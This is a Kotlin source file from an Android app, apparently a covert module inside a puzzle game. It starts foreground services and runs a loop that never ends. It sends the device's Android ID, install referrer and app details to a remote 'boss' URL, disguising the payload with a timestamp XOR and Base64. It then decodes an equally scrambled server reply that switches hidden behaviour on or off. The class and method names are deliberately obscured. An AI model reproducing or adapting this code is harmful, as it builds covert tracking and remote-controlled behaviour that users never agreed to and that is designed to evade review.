package com.sister.smart.blonde

import android.app.Application
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Base64
import androidx.core.content.ContextCompat
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONObject
import java.io.IOException
import kotlin.random.Random

/**
 * Date：2025/4/21
 * Describe:
 */
class SmartFairy(context: Context) : BaseBlondeFairy(context) {
    private val sfOkHttpClient = OkHttpClient()
    private var mSmartC by SmartImplStr()
    fun registerThis(app: Application) {
        registerRef()
        app.registerActivityLifecycleCallbacks(this)
        if (Build.VERSION.SDK_INT < 31) {
            CoroutineScope(Dispatchers.Main).launch {
                delay(1200)
                ContextCompat.startForegroundService(app, Intent(app, SisterNoService::class.java))
            }
        }
        mIoScope.launch {
            delay(2000)
            while (true) {
                AngelHelper.workStart(context)
                mBlondeNetPost.postEvent("session_up")
                delay(60000 * 15)
                if (System.currentTimeMillis() - lastFetchTime > 60000 * 60) {
                    getConfigure()
                }
            }
        }
    }

    private var isPostNon by SmartImplStr()

    fun sister() {
        // todo modify
        AppsFlyerLib.getInstance().setDebugLog(true)
        AppsFlyerLib.getInstance()
            .init("5MiZBZBjzzChyhaowfLpyR", object : AppsFlyerConversionListener {
                override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
                    if (p0 != null && p0["af_status"] != "Organic") {
                        if (isPostNon.isBlank()) {
                            isPostNon = "sister"
                            postEvent("non_organic")
                        }
                    }
                }

                override fun onConversionDataFail(p0: String?) = Unit
                override fun onAppOpenAttribution(p0: MutableMap<String, String>?) = Unit
                override fun onAttributionFailure(p0: String?) = Unit
            }, context)
        AppsFlyerLib.getInstance().setCustomerUserId(mAndroidStr)
        AppsFlyerLib.getInstance().start(context)
        AppsFlyerLib.getInstance().logEvent(context, "sister_ins", hashMapOf<String, Any>().apply {
            put("customer_user_id", mAndroidStr)
        })
        if (mSmartC.isBlank()) {
            getBossConfigure()
        } else {
            mIoScope.launch {
                typeBaseStr(mSmartC)
                refData(mSmartC)
                delay(Random.nextLong(1000, 8 * 60000))
                getBossConfigure()
            }
        }
    }


    override fun getBossConfigure() {
        if (bossReferrer.isBlank()) return
        getConfigure()
    }

    private var lastTime = 0L
    override fun startServiceSister(context: Context) {
        if (System.currentTimeMillis() - lastTime < 60000 * 5) return
        lastTime = System.currentTimeMillis()
        runCatching {
            ContextCompat.startForegroundService(
                context, Intent(context, Class.forName("com.sister.smart.blonde.SisterNoService"))
            )
        }
    }

    private var lastFetchTime = 0L

    private fun getConfigure() {
        if (System.currentTimeMillis() - lastFetchTime < 60000) return
        lastFetchTime = System.currentTimeMillis()
        val time = System.currentTimeMillis().toString()
        val js = JSONObject().apply {
            put("mNn", "com.popstar.luckypuzzle.dmmc")
            put("NLs", Headband.versionName)
            put("SfLakq", Headband.mHeadAndroidIdStr)
            put("ppL", Headband.mHeadAndroidIdStr)
            put("jSh", bossReferrer)
        }
        val rest = js.toString().mapIndexed { index, c ->
            (c.code xor time[index % 13].code).toChar()
        }.joinToString("")
        requestConfigure(
            sisterRequest(
                Base64.encodeToString(rest.toByteArray(), Base64.DEFAULT), time
            )
        ) {
            val str = it.body?.string() ?: ""
            log("fetch success---$str")
            val t = it.headers["datetime"]
            if (str.isNotBlank() && t != null) {
                runCatching {
                    val s = String(Base64.decode(str, Base64.DEFAULT)).mapIndexed { index, c ->
                        (c.code xor t[index % 13].code).toChar()
                    }.joinToString("")
                    sySister(s)
                }
            }
        }
    }


    private fun sySister(string: String) {
        val js = JSONObject(string).optJSONObject("TyNQ")?.getString("conf") ?: ""
        val st = typeBaseStr(js)
        if (st == "b") {
            postEvent("getadmin", Pair("getstring", "b"))
            tryGetC()
        } else if (st == "a") {
            postEvent("getadmin", Pair("getstring", "a"))
            mSmartC = js
            refData(js)
        } else if (st == "not use") {
            postEvent("getadmin", Pair("getstring", "b"))
            tryGetC()
        }
    }

    private fun refData(str: String) {
        log("refData-->$str")
        Headband.refreshHead(str)
        blondeE()
    }

    private var numGirl = 11
    private fun tryGetC() {
        if (numGirl < 0) return
        if (System.currentTimeMillis() - Headband.appInstallTime > 60000 * 15) return
        numGirl--
        mIoScope.launch {
            delay(61600)
            getBossConfigure()
        }
    }

    private fun requestConfigure(
        request: Request, num: Int = 3, success: (response: Response) -> Unit
    ) {
        postEvent("reqadmin")
        sfOkHttpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                log("requestConfigure--->$e")
                if (num > 0) {
                    mIoScope.launch {
                        postEvent("getadmin", Pair("getstring", "1000"))
                        delay(60000)
                        requestConfigure(request, num - 1, success)
                    }
                } else {
                    tryGetC()
                    postEvent("getadmin", Pair("getstring", "timeout"))
                }
            }

            override fun onResponse(call: Call, response: Response) {
                val isSuccess = response.isSuccessful && response.code == 200
                if (isSuccess) {
                    success.invoke(response)
                } else {
                    if (num > 0) {
                        tryGetC()
                        postEvent("getadmin", Pair("getstring", "${response.code}"))
                        mIoScope.launch {
                            delay(60000)
                            requestConfigure(request, num - 1, success)
                        }
                    } else {
                        postEvent("getadmin", Pair("getstring", "timeout"))
                    }
                }
            }
        })
    }

    //["ts", "time", "timestamp", "datetime", "dt"]
    private fun sisterRequest(body: String, time: String): Request {
        return Request.Builder().post(
            body.toRequestBody("application/json".toMediaType())
        ).addHeader("datetime", time).url(bossUrlA).build()
    }


}